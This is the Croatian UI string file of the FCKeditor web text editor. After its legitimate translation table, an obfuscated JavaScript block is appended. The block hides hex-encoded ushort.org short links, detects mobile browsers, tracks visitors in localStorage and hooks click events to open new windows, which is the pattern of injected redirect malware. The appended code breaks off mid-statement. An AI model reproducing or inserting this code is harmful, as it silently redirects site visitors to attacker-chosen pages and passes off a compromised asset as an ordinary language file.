/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Croatian language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Smanji trake s alatima",
ToolbarExpand		: "Proširi trake s alatima",

// Toolbar Items and Context Menu
Save				: "Snimi",
NewPage				: "Nova stranica",
Preview				: "Pregledaj",
Cut					: "Izreži",
Copy				: "Kopiraj",
Paste				: "Zalijepi",
PasteText			: "Zalijepi kao čisti tekst",
PasteWord			: "Zalijepi iz Worda",
Print				: "Ispiši",
SelectAll			: "Odaberi sve",
RemoveFormat		: "Ukloni formatiranje",
InsertLinkLbl		: "Link",
InsertLink			: "Ubaci/promijeni link",
RemoveLink			: "Ukloni link",
VisitLink			: "Otvori link",
Anchor				: "Ubaci/promijeni sidro",
AnchorDelete		: "Ukloni sidro",
InsertImageLbl		: "Slika",
InsertImage			: "Ubaci/promijeni sliku",
InsertFlashLbl		: "Flash",
InsertFlash			: "Ubaci/promijeni Flash",
InsertTableLbl		: "Tablica",
InsertTable			: "Ubaci/promijeni tablicu",
InsertLineLbl		: "Linija",
InsertLine			: "Ubaci vodoravnu liniju",
InsertSpecialCharLbl: "Posebni karakteri",
InsertSpecialChar	: "Ubaci posebne znakove",
InsertSmileyLbl		: "Smješko",
InsertSmiley		: "Ubaci smješka",
About				: "O FCKeditoru",
Bold				: "Podebljaj",
Italic				: "Ukosi",
Underline			: "Potcrtano",
StrikeThrough		: "Precrtano",
Subscript			: "Subscript",
Superscript			: "Superscript",
LeftJustify			: "Lijevo poravnanje",
CenterJustify		: "Središnje poravnanje",
RightJustify		: "Desno poravnanje",
BlockJustify		: "Blok poravnanje",
DecreaseIndent		: "Pomakni ulijevo",
IncreaseIndent		: "Pomakni udesno",
Blockquote			: "Blockquote",
CreateDiv			: "Napravi Div kontejner",
EditDiv				: "Uredi Div kontejner",
DeleteDiv			: "Ukloni Div kontejner",
Undo				: "Poništi",
Redo				: "Ponovi",
NumberedListLbl		: "Brojčana lista",
NumberedList		: "Ubaci/ukloni brojčanu listu",
BulletedListLbl		: "Obična lista",
BulletedList		: "Ubaci/ukloni običnu listu",
ShowTableBorders	: "Prikaži okvir tablice",
ShowDetails			: "Prikaži detalje",
Style				: "Stil",
FontFormat			: "Format",
Font				: "Font",
FontSize			: "Veličina",
TextColor			: "Boja teksta",
BGColor				: "Boja pozadine",
Source				: "Kôd",
Find				: "Pronađi",
Replace				: "Zamijeni",
SpellCheck			: "Provjeri pravopis",
UniversalKeyboard	: "Univerzalna tipkovnica",
PageBreakLbl		: "Prijelom stranice",
PageBreak			: "Ubaci prijelom stranice",

Form			: "Form",
Checkbox		: "Checkbox",
RadioButton		: "Radio Button",
TextField		: "Text Field",
Textarea		: "Textarea",
HiddenField		: "Hidden Field",
Button			: "Button",
SelectionField	: "Selection Field",
ImageButton		: "Image Button",

FitWindow		: "Povećaj veličinu editora",
ShowBlocks		: "Prikaži blokove",

// Context Menu
EditLink			: "Promijeni link",
CellCM				: "Ćelija",
RowCM				: "Red",
ColumnCM			: "Kolona",
InsertRowAfter		: "Ubaci red poslije",
InsertRowBefore		: "Ubaci red prije",
DeleteRows			: "Izbriši redove",
InsertColumnAfter	: "Ubaci kolonu poslije",
InsertColumnBefore	: "Ubaci kolonu prije",
DeleteColumns		: "Izbriši kolone",
InsertCellAfter		: "Ubaci ćeliju poslije",
InsertCellBefore	: "Ubaci ćeliju prije",
DeleteCells			: "Izbriši ćelije",
MergeCells			: "Spoji ćelije",
MergeRight			: "Spoji desno",
MergeDown			: "Spoji dolje",
HorizontalSplitCell	: "Podijeli ćeliju vodoravno",
VerticalSplitCell	: "Podijeli ćeliju okomito",
TableDelete			: "Izbriši tablicu",
CellProperties		: "Svojstva ćelije",
TableProperties		: "Svojstva tablice",
ImageProperties		: "Svojstva slike",
FlashProperties		: "Flash svojstva",

AnchorProp			: "Svojstva sidra",
ButtonProp			: "Image Button svojstva",
CheckboxProp		: "Checkbox svojstva",
HiddenFieldProp		: "Hidden Field svojstva",
RadioButtonProp		: "Radio Button svojstva",
ImageButtonProp		: "Image Button svojstva",
TextFieldProp		: "Text Field svojstva",
SelectionFieldProp	: "Selection svojstva",
TextareaProp		: "Textarea svojstva",
FormProp			: "Form svojstva",

FontFormats			: "Normal;Formatted;Address;Heading 1;Heading 2;Heading 3;Heading 4;Heading 5;Heading 6;Normal (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Obrađujem XHTML. Molimo pričekajte...",
Done				: "Završio",
PasteWordConfirm	: "Tekst koji želite zalijepiti čini se da je kopiran iz Worda. Želite li prije očistiti tekst?",
NotCompatiblePaste	: "Ova naredba je dostupna samo u Internet Exploreru 5.5 ili novijem. Želite li nastaviti bez čišćenja?",
UnknownToolbarItem	: "Nepoznati član trake s alatima \"%1\"",
UnknownCommand		: "Nepoznata naredba \"%1\"",
NotImplemented		: "Naredba nije implementirana",
UnknownToolbarSet	: "Traka s alatima \"%1\" ne postoji",
NoActiveX			: "Vaše postavke pretraživača mogle bi ograničiti neke od mogućnosti editora. Morate uključiti opciju \"Run ActiveX controls and plug-ins\" u postavkama. Ukoliko to ne učinite, moguće su razliite greške tijekom rada.",
BrowseServerBlocked : "Pretraivač nije moguće otvoriti. Provjerite da li je uključeno blokiranje pop-up prozora.",
DialogBlocked		: "Nije moguće otvoriti novi prozor. Provjerite da li je uključeno blokiranje pop-up prozora.",
VisitLinkBlocked	: "Nije moguće otvoriti novi prozor. Provjerite da li je uključeno blokiranje pop-up prozora.",

// Dialogs
DlgBtnOK			: "OK",
DlgBtnCancel		: "Poništi",
DlgBtnClose			: "Zatvori",
DlgBtnBrowseServer	: "Pretraži server",
DlgAdvancedTag		: "Napredno",
DlgOpOther			: "<Drugo>",
DlgInfoTab			: "Info",
DlgAlertUrl			: "Molimo unesite URL",

// General Dialogs Labels
DlgGenNotSet		: "<nije postavljeno>",
DlgGenId			: "Id",
DlgGenLangDir		: "Smjer jezika",
DlgGenLangDirLtr	: "S lijeva na desno (LTR)",
DlgGenLangDirRtl	: "S desna na lijevo (RTL)",
DlgGenLangCode		: "Kôd jezika",
DlgGenAccessKey		: "Pristupna tipka",
DlgGenName			: "Naziv",
DlgGenTabIndex		: "Tab Indeks",
DlgGenLongDescr		: "Dugački opis URL",
DlgGenClass			: "Stylesheet klase",
DlgGenTitle			: "Advisory naslov",
DlgGenContType		: "Advisory vrsta sadržaja",
DlgGenLinkCharset	: "Kodna stranica povezanih resursa",
DlgGenStyle			: "Stil",

// Image Dialog
DlgImgTitle			: "Svojstva slika",
DlgImgInfoTab		: "Info slike",
DlgImgBtnUpload		: "Pošalji na server",
DlgImgURL			: "URL",
DlgImgUpload		: "Pošalji",
DlgImgAlt			: "Alternativni tekst",
DlgImgWidth			: "Širina",
DlgImgHeight		: "Visina",
DlgImgLockRatio		: "Zaključaj odnos",
DlgBtnResetSize		: "Obriši veličinu",
DlgImgBorder		: "Okvir",
DlgImgHSpace		: "HSpace",
DlgImgVSpace		: "VSpace",
DlgImgAlign			: "Poravnaj",
DlgImgAlignLeft		: "Lijevo",
DlgImgAlignAbsBottom: "Abs dolje",
DlgImgAlignAbsMiddle: "Abs sredina",
DlgImgAlignBaseline	: "Bazno",
DlgImgAlignBottom	: "Dolje",
DlgImgAlignMiddle	: "Sredina",
DlgImgAlignRight	: "Desno",
DlgImgAlignTextTop	: "Vrh teksta",
DlgImgAlignTop		: "Vrh",
DlgImgPreview		: "Pregledaj",
DlgImgAlertUrl		: "Unesite URL slike",
DlgImgLinkTab		: "Link",

// Flash Dialog
DlgFlashTitle		: "Flash svojstva",
DlgFlashChkPlay		: "Auto Play",
DlgFlashChkLoop		: "Ponavljaj",
DlgFlashChkMenu		: "Omogući Flash izbornik",
DlgFlashScale		: "Omjer",
DlgFlashScaleAll	: "Prikaži sve",
DlgFlashScaleNoBorder	: "Bez okvira",
DlgFlashScaleFit	: "Točna veličina",

// Link Dialog
DlgLnkWindowTitle	: "Link",
DlgLnkInfoTab		: "Link Info",
DlgLnkTargetTab		: "Meta",

DlgLnkType			: "Link vrsta",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Sidro na ovoj stranici",
DlgLnkTypeEMail		: "E-Mail",
DlgLnkProto			: "Protokol",
DlgLnkProtoOther	: "<drugo>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Odaberi sidro",
DlgLnkAnchorByName	: "Po nazivu sidra",
DlgLnkAnchorById	: "Po Id elementa",
DlgLnkNoAnchors		: "(Nema dostupnih sidra)",
DlgLnkEMail			: "E-Mail adresa",
DlgLnkEMailSubject	: "Naslov",
DlgLnkEMailBody		: "Sadržaj poruke",
DlgLnkUpload		: "Pošalji",
DlgLnkBtnUpload		: "Pošalji na server",

DlgLnkTarget		: "Meta",
DlgLnkTargetFrame	: "<okvir>",
DlgLnkTargetPopup	: "<popup prozor>",
DlgLnkTargetBlank	: "Novi prozor (_blank)",
DlgLnkTargetParent	: "Roditeljski prozor (_parent)",
DlgLnkTargetSelf	: "Isti prozor (_self)",
DlgLnkTargetTop		: "Vršni prozor (_top)",
DlgLnkTargetFrameName	: "Ime ciljnog okvira",
DlgLnkPopWinName	: "Naziv popup prozora",
DlgLnkPopWinFeat	: "Mogućnosti popup prozora",
DlgLnkPopResize		: "Promjenljive veličine",
DlgLnkPopLocation	: "Traka za lokaciju",
DlgLnkPopMenu		: "Izborna traka",
DlgLnkPopScroll		: "Scroll traka",
DlgLnkPopStatus		: "Statusna traka",
DlgLnkPopToolbar	: "Traka s alatima",
DlgLnkPopFullScrn	: "Cijeli ekran (IE)",
DlgLnkPopDependent	: "Ovisno (Netscape)",
DlgLnkPopWidth		: "Širina",
DlgLnkPopHeight		: "Visina",
DlgLnkPopLeft		: "Lijeva pozicija",
DlgLnkPopTop		: "Gornja pozicija",

DlnLnkMsgNoUrl		: "Molimo upišite URL link",
DlnLnkMsgNoEMail	: "Molimo upišite e-mail adresu",
DlnLnkMsgNoAnchor	: "Molimo odaberite sidro",
DlnLnkMsgInvPopName	: "Ime popup prozora mora početi sa slovom i ne smije sadržavati razmake",

// Color Dialog
DlgColorTitle		: "Odaberite boju",
DlgColorBtnClear	: "Obriši",
DlgColorHighlight	: "Osvijetli",
DlgColorSelected	: "Odaberi",

// Smiley Dialog
DlgSmileyTitle		: "Ubaci smješka",

// Special Character Dialog
DlgSpecialCharTitle	: "Odaberite posebni karakter",

// Table Dialog
DlgTableTitle		: "Svojstva tablice",
DlgTableRows		: "Redova",
DlgTableColumns		: "Kolona",
DlgTableBorder		: "Veličina okvira",
DlgTableAlign		: "Poravnanje",
DlgTableAlignNotSet	: "<nije postavljeno>",
DlgTableAlignLeft	: "Lijevo",
DlgTableAlignCenter	: "Središnje",
DlgTableAlignRight	: "Desno",
DlgTableWidth		: "Širina",
DlgTableWidthPx		: "piksela",
DlgTableWidthPc		: "postotaka",
DlgTableHeight		: "Visina",
DlgTableCellSpace	: "Prostornost ćelija",
DlgTableCellPad		: "Razmak ćelija",
DlgTableCaption		: "Naslov",
DlgTableSummary		: "Sažetak",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Svojstva ćelije",
DlgCellWidth		: "Širina",
DlgCellWidthPx		: "piksela",
DlgCellWidthPc		: "postotaka",
DlgCellHeight		: "Visina",
DlgCellWordWrap		: "Word Wrap",
DlgCellWordWrapNotSet	: "<nije postavljeno>",
DlgCellWordWrapYes	: "Da",
DlgCellWordWrapNo	: "Ne",
DlgCellHorAlign		: "Vodoravno poravnanje",
DlgCellHorAlignNotSet	: "<nije postavljeno>",
DlgCellHorAlignLeft	: "Lijevo",
DlgCellHorAlignCenter	: "Središnje",
DlgCellHorAlignRight: "Desno",
DlgCellVerAlign		: "Okomito poravnanje",
DlgCellVerAlignNotSet	: "<nije postavljeno>",
DlgCellVerAlignTop	: "Gornje",
DlgCellVerAlignMiddle	: "Srednišnje",
DlgCellVerAlignBottom	: "Donje",
DlgCellVerAlignBaseline	: "Bazno",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "Spajanje redova",
DlgCellCollSpan		: "Spajanje kolona",
DlgCellBackColor	: "Boja pozadine",
DlgCellBorderColor	: "Boja okvira",
DlgCellBtnSelect	: "Odaberi...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "Pronađi i zamijeni",

// Find Dialog
DlgFindTitle		: "Pronađi",
DlgFindFindBtn		: "Pronađi",
DlgFindNotFoundMsg	: "Traženi tekst nije pronađen.",

// Replace Dialog
DlgReplaceTitle			: "Zamijeni",
DlgReplaceFindLbl		: "Pronađi:",
DlgReplaceReplaceLbl	: "Zamijeni s:",
DlgReplaceCaseChk		: "Usporedi mala/velika slova",
DlgReplaceReplaceBtn	: "Zamijeni",
DlgReplaceReplAllBtn	: "Zamijeni sve",
DlgReplaceWordChk		: "Usporedi cijele riječi",

// Paste Operations / Dialog
PasteErrorCut	: "Sigurnosne postavke Vašeg pretraživača ne dozvoljavaju operacije automatskog izrezivanja. Molimo koristite kraticu na tipkovnici (Ctrl+X).",
PasteErrorCopy	: "Sigurnosne postavke Vašeg pretraživača ne dozvoljavaju operacije automatskog kopiranja. Molimo koristite kraticu na tipkovnici (Ctrl+C).",

PasteAsText		: "Zalijepi kao čisti tekst",
PasteFromWord	: "Zalijepi iz Worda",

DlgPasteMsg2	: "Molimo zaljepite unutar doljnjeg okvira koristeći tipkovnicu (<STRONG>Ctrl+V</STRONG>) i kliknite <STRONG>OK</STRONG>.",
DlgPasteSec		: "Zbog sigurnosnih postavki Vašeg pretraživača, editor nema direktan pristup Vašem međuspremniku. Potrebno je ponovno zalijepiti tekst u ovaj prozor.",
DlgPasteIgnoreFont		: "Zanemari definiciju vrste fonta",
DlgPasteRemoveStyles	: "Ukloni definicije stilova",

// Color Picker
ColorAutomatic	: "Automatski",
ColorMoreColors	: "Više boja...",

// Document Properties
DocProps		: "Svojstva dokumenta",

// Anchor Dialog
DlgAnchorTitle		: "Svojstva sidra",
DlgAnchorName		: "Ime sidra",
DlgAnchorErrorName	: "Molimo unesite ime sidra",

// Speller Pages Dialog
DlgSpellNotInDic		: "Nije u rječniku",
DlgSpellChangeTo		: "Promijeni u",
DlgSpellBtnIgnore		: "Zanemari",
DlgSpellBtnIgnoreAll	: "Zanemari sve",
DlgSpellBtnReplace		: "Zamijeni",
DlgSpellBtnReplaceAll	: "Zamijeni sve",
DlgSpellBtnUndo			: "Vrati",
DlgSpellNoSuggestions	: "-Nema preporuke-",
DlgSpellProgress		: "Provjera u tijeku...",
DlgSpellNoMispell		: "Provjera završena: Nema grešaka",
DlgSpellNoChanges		: "Provjera završena: Nije napravljena promjena",
DlgSpellOneChange		: "Provjera završena: Jedna riječ promjenjena",
DlgSpellManyChanges		: "Provjera završena: Promijenjeno %1 riječi",

IeSpellDownload			: "Provjera pravopisa nije instalirana. Želite li skinuti provjeru pravopisa?",

// Button Dialog
DlgButtonText		: "Tekst (vrijednost)",
DlgButtonType		: "Vrsta",
DlgButtonTypeBtn	: "Gumb",
DlgButtonTypeSbm	: "Pošalji",
DlgButtonTypeRst	: "Poništi",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Ime",
DlgCheckboxValue	: "Vrijednost",
DlgCheckboxSelected	: "Odabrano",

// Form Dialog
DlgFormName		: "Ime",
DlgFormAction	: "Akcija",
DlgFormMethod	: "Metoda",

// Select Field Dialog
DlgSelectName		: "Ime",
DlgSelectValue		: "Vrijednost",
DlgSelectSize		: "Veličina",
DlgSelectLines		: "linija",
DlgSelectChkMulti	: "Dozvoli višestruki odabir",
DlgSelectOpAvail	: "Dostupne opcije",
DlgSelectOpText		: "Tekst",
DlgSelectOpValue	: "Vrijednost",
DlgSelectBtnAdd		: "Dodaj",
DlgSelectBtnModify	: "Promijeni",
DlgSelectBtnUp		: "Gore",
DlgSelectBtnDown	: "Dolje",
DlgSelectBtnSetValue : "Postavi kao odabranu vrijednost",
DlgSelectBtnDelete	: "Obriši",

// Textarea Dialog
DlgTextareaName	: "Ime",
DlgTextareaCols	: "Kolona",
DlgTextareaRows	: "Redova",

// Text Field Dialog
DlgTextName			: "Ime",
DlgTextValue		: "Vrijednost",
DlgTextCharWidth	: "Širina",
DlgTextMaxChars		: "Najviše karaktera",
DlgTextType			: "Vrsta",
DlgTextTypeText		: "Tekst",
DlgTextTypePass		: "Šifra",

// Hidden Field Dialog
DlgHiddenName	: "Ime",
DlgHiddenValue	: "Vrijednost",

// Bulleted List Dialog
BulletedListProp	: "Svojstva liste",
NumberedListProp	: "Svojstva brojčane liste",
DlgLstStart			: "Početak",
DlgLstType			: "Vrsta",
DlgLstTypeCircle	: "Krug",
DlgLstTypeDisc		: "Disk",
DlgLstTypeSquare	: "Kvadrat",
DlgLstTypeNumbers	: "Brojevi (1, 2, 3)",
DlgLstTypeLCase		: "Mala slova (a, b, c)",
DlgLstTypeUCase		: "Velika slova (A, B, C)",
DlgLstTypeSRoman	: "Male rimske brojke (i, ii, iii)",
DlgLstTypeLRoman	: "Velike rimske brojke (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Općenito",
DlgDocBackTab		: "Pozadina",
DlgDocColorsTab		: "Boje i margine",
DlgDocMetaTab		: "Meta Data",

DlgDocPageTitle		: "Naslov stranice",
DlgDocLangDir		: "Smjer jezika",
DlgDocLangDirLTR	: "S lijeva na desno",
DlgDocLangDirRTL	: "S desna na lijevo",
DlgDocLangCode		: "Kôd jezika",
DlgDocCharSet		: "Enkodiranje znakova",
DlgDocCharSetCE		: "Središnja Europa",
DlgDocCharSetCT		: "Tradicionalna kineska (Big5)",
DlgDocCharSetCR		: "Ćirilica",
DlgDocCharSetGR		: "Grčka",
DlgDocCharSetJP		: "Japanska",
DlgDocCharSetKR		: "Koreanska",
DlgDocCharSetTR		: "Turska",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "Zapadna Europa",
DlgDocCharSetOther	: "Ostalo enkodiranje znakova",

DlgDocDocType		: "Zaglavlje vrste dokumenta",
DlgDocDocTypeOther	: "Ostalo zaglavlje vrste dokumenta",
DlgDocIncXHTML		: "Ubaci XHTML deklaracije",
DlgDocBgColor		: "Boja pozadine",
DlgDocBgImage		: "URL slike pozadine",
DlgDocBgNoScroll	: "Pozadine se ne pomiče",
DlgDocCText			: "Tekst",
DlgDocCLink			: "Link",
DlgDocCVisited		: "Posjećeni link",
DlgDocCActive		: "Aktivni link",
DlgDocMargins		: "Margine stranice",
DlgDocMaTop			: "Vrh",
DlgDocMaLeft		: "Lijevo",
DlgDocMaRight		: "Desno",
DlgDocMaBottom		: "Dolje",
DlgDocMeIndex		: "Ključne riječi dokumenta (odvojene zarezom)",
DlgDocMeDescr		: "Opis dokumenta",
DlgDocMeAuthor		: "Autor",
DlgDocMeCopy		: "Autorska prava",
DlgDocPreview		: "Pregledaj",

// Templates Dialog
Templates			: "Predlošci",
DlgTemplatesTitle	: "Predlošci sadržaja",
DlgTemplatesSelMsg	: "Molimo odaberite predložak koji želite otvoriti<br>(stvarni sadržaj će biti izgubljen):",
DlgTemplatesLoading	: "Učitavam listu predložaka. Molimo pričekajte...",
DlgTemplatesNoTpl	: "(Nema definiranih predložaka)",
DlgTemplatesReplace	: "Zamijeni trenutne sadržaje",

// About Dialog
DlgAboutAboutTab	: "O FCKEditoru",
DlgAboutBrowserInfoTab	: "Podaci o pretraživaču",
DlgAboutLicenseTab	: "Licenca",
DlgAboutVersion		: "inačica",
DlgAboutInfo		: "Za više informacija posjetite",

// Div Dialog
DlgDivGeneralTab	: "Općenito",
DlgDivAdvancedTab	: "Napredno",
DlgDivStyle		: "Stil",
DlgDivInlineStyle	: "Stil u redu",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const 